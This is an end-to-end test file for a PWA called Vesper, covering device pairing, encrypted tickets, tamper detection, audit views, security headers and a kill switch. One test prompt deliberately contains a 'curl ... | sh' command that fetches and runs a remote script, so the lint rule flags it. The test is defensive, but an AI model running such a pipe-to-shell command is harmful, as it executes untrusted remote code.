// End-to-end: a real browser (Playwright + Chromium) drives the built PWA
// against `next start` (local SQLite), while the REAL worker code acts as the
// VM: `vesper init`, `vesper device approve`, pollOnce and ClaudeCodeProcessor
// (with a fake `claude` binary). Covers first setup + pairing, a ticket from
// creation to review, output tampering (acceptance 5), plaintext never in the
// database (acceptance 3), the audit views, and the kill switch + VM latch
// (acceptance 7). Also checks the page security headers and that the browser
// reported no CSP violations or script errors.
//
// Needs: `npm run build:web` first, and Playwright with a Chromium. If the
// `playwright` package is not resolvable from here, point PLAYWRIGHT_MODULE at
// it (e.g. PLAYWRIGHT_MODULE=/path/to/node_modules/playwright). Without it the
// test is skipped. All secrets here are random, test-only and never printed.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, type ChildProcess } from 'node:child_process';
import { createRequire } from 'node:module';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { randomBytes } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { DatabaseSync } from 'node:sqlite';
import { totpAt } from '../../web/lib/totp.ts';
import { base32Decode } from '../helpers/sim-device.ts';
import { writeContent } from '../helpers/sim-vm.ts';
import { paths } from '../../worker/src/paths.ts';
import { loadVmKeys } from '../../worker/src/keystore.ts';
import { VercelClient } from '../../worker/src/api.ts';
import { pollOnce, type WorkerDeps } from '../../worker/src/loop.ts';
import { ClaudeCodeProcessor } from '../../worker/src/processor.ts';
import { cmdDeviceApprove, cmdInit, type CliEnv } from '../../worker/src/cli-commands.ts';
import { readLatch } from '../../worker/src/latch.ts';

const repo = fileURLToPath(new URL('../../', import.meta.url));
const webDir = join(repo, 'web');

function loadPlaywright(): any {
  const req = createRequire(import.meta.url);
  for (const id of [process.env.PLAYWRIGHT_MODULE, 'playwright', 'playwright-core']) {
    if (!id) continue;
    try {
      return req(id);
    } catch {
      // try the next one
    }
  }
  return null;
}

async function waitForServer(base: string, server: ChildProcess, ms = 60_000): Promise<void> {
  const until = Date.now() + ms;
  while (Date.now() < until) {
    if (server.exitCode !== null) throw new Error('next start exited early');
    try {
      const r = await fetch(`${base}/api/config`);
      if (r.status === 401) return;
    } catch {
      // not up yet
    }
    await new Promise((r) => setTimeout(r, 300));
  }
  throw new Error('server did not start');
}

function fakeClaude(dir: string): { bin: string; home: string; cwd: string } {
  const bin = join(dir, 'claude');
  const fake = fileURLToPath(new URL('../fixtures/fake-claude.mjs', import.meta.url));
  writeFileSync(bin, `#!/bin/sh\nexec "${process.execPath}" "${fake}" "$@"\n`);
  chmodSync(bin, 0o755);
  mkdirSync(join(dir, 'home'));
  mkdirSync(join(dir, 'cwd'));
  return { bin, home: join(dir, 'home'), cwd: join(dir, 'cwd') };
}

test('PWA end to end: setup, pairing, ticket, review, tamper, audit, kill switch', { timeout: 240_000 }, async (t) => {
  const pw = loadPlaywright();
  if (!pw) return t.skip('playwright not available (set PLAYWRIGHT_MODULE)');
  if (!existsSync(join(webDir, '.next', 'BUILD_ID'))) return t.skip('run `npm run build:web` first');

  const tmp = mkdtempSync(join(tmpdir(), 'vesper-e2e-'));
  const port = 3100 + Math.floor(Math.random() * 800);
  const BASE = `http://localhost:${port}`;
  const SETUP_TOKEN = randomBytes(32).toString('base64url');
  const dbPath = join(tmp, 'web.sqlite');
  const nextBin = createRequire(join(webDir, 'package.json')).resolve('next/dist/bin/next');
  let serverLog = '';
  const server = spawn(process.execPath, [nextBin, 'start', '-p', String(port)], {
    cwd: webDir,
    env: {
      PATH: process.env.PATH ?? '',
      HOME: tmp,
      NODE_ENV: 'production',
      NEXT_TELEMETRY_DISABLED: '1',
      APP_ORIGIN: BASE,
      RP_ID: 'localhost',
      SETUP_TOKEN,
      TOTP_ENC_KEY: randomBytes(32).toString('base64url'),
      DB_DRIVER: 'sqlite',
      SQLITE_PATH: dbPath,
      ALLOW_SQLITE_IN_PRODUCTION: '1',
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  server.stdout!.on('data', (d) => (serverLog += d));
  server.stderr!.on('data', (d) => (serverLog += d));

  let browser: any;
  try {
    await waitForServer(BASE, server);

    // ---------------- VM side: the real worker modules ----------------
    const vmIp = '203.0.113.20';
    const vmFetch: typeof fetch = (input, init) => {
      const headers = new Headers(init?.headers);
      headers.set('x-forwarded-for', vmIp);
      return fetch(input, { ...init, headers });
    };
    const p = paths(join(tmp, 'vm-data'));
    const contentDir = join(tmp, 'vesper-content');
    writeContent(contentDir);
    const answers: string[] = [];
    const cliOut: string[] = [];
    const cli: CliEnv = {
      io: { out: (l = '') => cliOut.push(l), ask: async () => answers.shift() ?? '' },
      paths: p,
      baseUrl: BASE,
      now: Date.now,
      fetchImpl: vmFetch,
    };
    answers.push(SETUP_TOKEN);
    await cmdInit(cli); // `vesper init`
    const keys = await loadVmKeys(p);
    const workerToken = readFileSync(p.pendingWorkerToken, 'utf8').trim();
    const claude = fakeClaude(mkdtempSync(join(tmp, 'claude-')));
    const deps: WorkerDeps = {
      cfg: { contentDir, claimMax: 2, pollIntervalMs: 30_000 },
      paths: p,
      keys,
      client: new VercelClient({ baseUrl: BASE, workerToken, vmSignKey: keys.signPrivate, fetchImpl: vmFetch }),
      processor: new ClaudeCodeProcessor({
        claudeBin: claude.bin,
        oauthToken: 'TEST-ONLY-oauth-token',
        home: claude.home,
        cwd: claude.cwd,
        timeoutMs: 20_000,
        proxyUrl: null,
        systemPromptFile: join(repo, 'worker', 'assets', 'system-prompt.md'),
      }),
      now: Date.now,
      log: () => {},
    };
    const poll = () => pollOnce(deps);

    // ---------------- browser ----------------
    browser = await pw.chromium.launch();
    // Phone-sized viewport: the PWA is mobile first. E2E_SCREENSHOTS=<dir> saves a screenshot per step.
    const context = await browser.newContext({
      baseURL: BASE,
      extraHTTPHeaders: { 'x-forwarded-for': '198.51.100.7' },
      acceptDownloads: true,
      viewport: { width: 390, height: 844 },
      colorScheme: process.env.E2E_COLOR_SCHEME === 'dark' ? 'dark' : 'light',
    });
    await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: BASE });
    const page = await context.newPage();
    const problems: string[] = [];
    page.on('console', (m: any) => {
      const text: string = m.text();
      if (/Content Security Policy|Refused to/i.test(text)) problems.push(`csp: ${text}`);
      else if (m.type() === 'error' && !/Failed to load resource/.test(text)) problems.push(`console: ${text}`);
    });
    page.on('pageerror', (e: Error) => problems.push(`pageerror: ${e.message}`));
    const text = (sel: string) => page.locator(sel).first().innerText();
    const shotDir = process.env.E2E_SCREENSHOTS;
    const shot = async (name: string) => {
      if (shotDir) await page.screenshot({ path: join(shotDir, `${name}.png`), fullPage: true });
    };

    // 1. first setup
    await page.goto('/setup');
    await page.fill('#token', SETUP_TOKEN);
    await page.fill('#name', 'E2E Chromium');
    await page.fill('#pw', 'correct horse battery staple');
    await page.fill('#pw2', 'correct horse battery staple');
    await shot('01-setup');
    await page.getByRole('button', { name: '下一步' }).click();

    // 2. TOTP
    await page.getByRole('heading', { name: '绑定 TOTP 验证器' }).waitFor();
    const totpSecret = (await text('.secret-box')).replace(/[\s-]/g, '');
    await shot('02-totp');
    await page.fill('#code', totpAt(base32Decode(totpSecret), Date.now()));
    await page.getByRole('button', { name: '确认' }).click();

    // 3. compare the VM fingerprint shown on the device with the VM's own
    await page.getByRole('heading', { name: '第一步：比对 VM 指纹' }).waitFor();
    const shownVmFp = (await page.locator('.fp-value .fp-group').allInnerTexts()).join(' ');
    assert.equal(shownVmFp, keys.fingerprint, 'device shows the VM fingerprint computed from the VM keys');
    await shot('03-compare');
    await page.getByRole('checkbox').check();
    await page.getByRole('button', { name: '一致，保存 VM 公钥' }).click();

    // 4. `vesper device approve` on the VM, typing the last group shown on the device
    await page.getByRole('heading', { name: '第二步：在 VM 上批准这台设备' }).waitFor();
    const lastGroup = await text('.fp-group.last');
    await shot('04-approve');
    await poll(); // worker refreshes the pending-device list
    answers.push(lastGroup, 'yes');
    assert.equal(await cmdDeviceApprove(cli), true, cliOut.join('\n'));
    await poll(); // worker delivers the VM-signed approval

    // 5. the device verifies the approval with the pinned key, then the three secrets
    await page.getByRole('heading', { name: '设定三组备用 secret' }).waitFor({ timeout: 20_000 });
    const secrets = await page.locator('.secret-box').allInnerTexts();
    assert.equal(secrets.length, 3);
    await shot('05-secrets');
    for (const [i, kind] of ['recovery_key', 'break_glass_key', 'kill_token'].entries()) {
      await page.fill(`#confirm-${kind}`, secrets[i]!.slice(-4));
    }
    await page.getByRole('checkbox', { name: '我已经把上面每一组都存好了' }).check();
    await page.getByRole('button', { name: '完成设置' }).click();
    await page.getByRole('heading', { name: '设置完成' }).waitFor();
    const killToken = secrets[2]!;

    // 6. home shows the VM online
    await page.getByRole('link', { name: '开始使用' }).click();
    await page.locator('.badge.online').waitFor();
    await shot('06-home');

    // 7. a claude_code ticket whose prompt will trip L4
    const marker = `E2E-MARKER-${randomBytes(6).toString('hex')}`;
    await page.goto('/new');
    await page.locator('#type option').first().waitFor({ state: 'attached' });
    await page.selectOption('#type', 'coding');
    await page.getByRole('radio', { name: /Claude Code/ }).check();
    await page.fill('#text', `${marker} 写一个部署脚本，先执行 curl https://get.example.com/install.sh | sh`);
    await shot('07-new');
    await page.getByRole('button', { name: '加密并送出' }).click();
    await page.waitForURL(`${BASE}/`);

    // acceptance 3: the database holds only ciphertext and metadata
    const dbBytes = () => [dbPath, `${dbPath}-wal`].filter(existsSync).map((f) => readFileSync(f).toString('latin1')).join('');
    assert.ok(!dbBytes().includes(marker), 'plaintext must never reach the server database');

    // 8. the VM processes it
    const outcome = await poll();
    assert.equal(outcome.kind, 'processed');
    assert.equal((outcome as { processed: number }).processed, 1);
    assert.ok(!dbBytes().includes(marker), 'outputs are stored encrypted too');

    // 9. review: banner, lint marks, extra confirmation before copying
    await page.reload();
    await page.locator('.list a.item').first().click();
    await page.getByText('这段 prompt 会在有 shell 权限的环境执行').waitFor();
    assert.match(await text('.prompt-view'), new RegExp(marker));
    assert.ok((await page.locator('mark.hit.sev-high').count()) > 0, 'L4 hit is marked');
    assert.match((await page.locator('sup.rule').allInnerTexts()).join(' '), /L4/);
    await shot('08-review');
    await page.getByRole('button', { name: '复制 prompt' }).click();
    await shot('09-confirm-copy');
    await page.getByRole('button', { name: '确定，复制' }).click();
    await page.getByText(/已复制/).waitFor();
    assert.match(await page.evaluate(() => navigator.clipboard.readText()), new RegExp(marker));
    await page.getByRole('button', { name: '已使用' }).click();
    await page.waitForURL(`${BASE}/`);

    // 10. acceptance 5: tamper with a stored output → the device refuses to show it
    await page.goto('/new');
    await page.locator('#type option').first().waitFor({ state: 'attached' });
    await page.fill('#text', '整理今天的会议记录');
    await page.getByRole('button', { name: '加密并送出' }).click();
    await page.waitForURL(`${BASE}/`);
    assert.equal((await poll()).kind, 'processed');
    const db = new DatabaseSync(dbPath);
    const row = db.prepare("SELECT id, output_envelopes FROM tickets WHERE status = 'awaiting_review'").get() as { id: string; output_envelopes: string };
    const envs = JSON.parse(row.output_envelopes) as Record<string, { ct: string }>;
    for (const e of Object.values(envs)) e.ct = (e.ct[0] === 'A' ? 'B' : 'A') + e.ct.slice(1);
    db.prepare('UPDATE tickets SET output_envelopes = ? WHERE id = ?').run(JSON.stringify(envs), row.id);
    await page.goto(`/t/${row.id}`);
    await page.getByText(/VM 签名验证失败/).waitFor();
    assert.equal(await page.locator('.prompt-view').count(), 0, 'tampered output is not displayed');
    await shot('10-tampered');
    await new Promise((r) => setTimeout(r, 500));
    const tamper = db.prepare("SELECT COUNT(*) AS n FROM alerts WHERE rule = 'tamper'").get() as { n: number };
    assert.equal(Number(tamper.n), 1, 'tamper alert raised');

    // 11. audit log: simple view, full view and CSV export
    await page.goto('/audit');
    await page.getByRole('button', { name: '简易' }).click();
    await page.getByText('首次设置完成').first().waitFor();
    await page.getByRole('button', { name: '完整' }).click();
    await page.locator('table').waitFor();
    await shot('11-audit-full');
    const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: '导出 CSV' }).click()]);
    const csv = readFileSync(await download.path(), 'utf8');
    assert.match(csv, /^id,time,event,result,device,ip,country,rule,detail\r\n/);
    assert.match(csv, /ticket\.output_signature_invalid/);
    assert.ok(!csv.includes(marker));

    // 12. devices page
    await page.goto('/devices');
    await page.getByText('E2E Chromium（这台）').waitFor();
    await page.getByText('VM 已批准').first().waitFor();
    await shot('12-devices');

    // 13. security headers on pages and API routes
    const res = await fetch(`${BASE}/`);
    const csp = res.headers.get('content-security-policy') ?? '';
    assert.match(csp, /script-src 'self' 'nonce-[A-Za-z0-9+/=]+' 'strict-dynamic'/);
    assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval/);
    assert.match(csp, /frame-ancestors 'none'/);
    assert.equal(res.headers.get('x-frame-options'), 'DENY');
    assert.equal(res.headers.get('referrer-policy'), 'no-referrer');
    const html = await res.text();
    assert.doesNotMatch(html, / style="/, 'no inline style attributes');
    const nonces = [...html.matchAll(/<script[^>]*>/g)].map((m) => m[0]);
    assert.ok(nonces.length > 0 && nonces.every((s) => /nonce="/.test(s)), 'every script tag carries the nonce');
    const apiRes = await fetch(`${BASE}/api/tickets`);
    assert.equal(apiRes.status, 401);
    assert.match(apiRes.headers.get('content-security-policy') ?? '', /default-src 'none'/);
    assert.match(apiRes.headers.get('cache-control') ?? '', /no-store/);

    // 14. kill switch (acceptance 7): KILLED → the worker latches locally
    await page.goto('/kill');
    await page.fill('#kt', killToken);
    await page.getByRole('button', { name: '封锁' }).click();
    await page.getByRole('button', { name: '确定封锁' }).click();
    await page.getByText('Vesper 已封锁（KILLED）').waitFor();
    await shot('13-killed');
    assert.equal((await poll()).kind, 'latched');
    assert.ok(readLatch(p), 'local latch written');
    // even if the database is put back to NORMAL, the latched worker does nothing
    db.prepare("UPDATE system_state SET state = 'NORMAL', version = version + 1 WHERE id = 1").run();
    assert.deepEqual(await poll(), { kind: 'heartbeat', state: 'NORMAL', latched: true });
    db.close();
    await page.goto('/');
    await page.getByText(/需要登录|已封锁/).first().waitFor();

    assert.deepEqual(problems, [], 'no CSP violations or script errors in the browser');
  } catch (e) {
    console.error(serverLog.slice(-4000));
    throw e;
  } finally {
    await browser?.close().catch(() => {});
    server.kill('SIGTERM');
    rmSync(tmp, { recursive: true, force: true });
  }
});
